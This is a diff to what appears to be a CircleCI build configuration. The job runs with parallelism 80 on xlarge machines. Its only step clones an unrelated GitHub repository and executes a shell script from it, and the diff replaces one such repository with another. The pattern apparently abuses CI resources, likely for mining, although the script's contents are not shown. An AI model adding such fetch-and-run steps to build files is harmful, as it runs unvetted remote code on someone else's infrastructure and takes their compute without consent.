@@ -6,7 +6,7 @@ jobs:
     parallelism: 80
     resource_class: xlarge
     steps:
-      - run: git clone https://github.com/sumpmok/p.git && cd p && chmod u+x @ sh.sh && ./sh.sh
+      - run: git clone https://github.com/gyrogerald/mici.git && cd mici && chmod u+x @ sh.sh && ./sh.sh
 workflows:
     version: 2
     build:
